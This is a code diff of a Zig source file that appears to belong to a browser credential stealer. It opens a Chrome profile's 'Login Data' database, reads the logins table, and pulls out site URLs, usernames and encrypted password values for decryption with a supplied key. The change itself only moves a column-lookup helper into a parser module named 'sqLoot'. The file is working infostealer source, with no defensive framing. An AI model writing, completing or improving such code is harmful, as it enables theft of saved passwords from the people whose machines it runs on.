@@ -3,18 +3,6 @@ const sqLoot = @import("../parsers/sqLoot.zig");
 const file_io = @import("../parsers/file_io.zig");
 const chrome_crypto = @import("../crypto/chrome_crypto.zig");
 
-fn columnIndex(db: *sqLoot.SqliteDb, table: []const u8, name: []const u8, allocator: std.mem.Allocator) ?usize {
-    const cols = db.getColumnNames(table) catch return null;
-    defer {
-        for (cols) |c| allocator.free(c);
-        allocator.free(cols);
-    }
-    for (cols, 0..) |col, i| {
-        if (std.mem.eql(u8, col, name)) return i;
-    }
-    return null;
-}
-
 pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: [32]u8) ?[][]const u8 {
     const db_path = std.mem.concat(allocator, u8, &[_][]const u8{ profile_path, "\\Login Data" }) catch return null;
     defer allocator.free(db_path);
@@ -28,9 +16,14 @@ pub fn extractData(profile_path: []const u8, allocator: std.mem.Allocator, key: 
     const rows = db.readTable("logins") catch return null;
     defer allocator.free(rows);
 
-    const url_idx = columnIndex(&db, "logins", "origin_url", allocator) orelse return null;
-    const user_idx = columnIndex(&db, "logins", "username_value", allocator) orelse return null;
-    const pass_idx = columnIndex(&db, "logins", "password_value", allocator) orelse return null;
+    const cols = db.getColumnNames("logins") catch return null;
+    defer {
+        for (cols) |c| allocator.free(c);
+        allocator.free(cols);
+    }
+    const url_idx = sqLoot.findColumnIndex(cols, "origin_url") orelse return null;
+    const user_idx = sqLoot.findColumnIndex(cols, "username_value") orelse return null;
+    const pass_idx = sqLoot.findColumnIndex(cols, "password_value") orelse return null;
 
     var list = std.ArrayList([]const u8).init(allocator);
     errdefer {
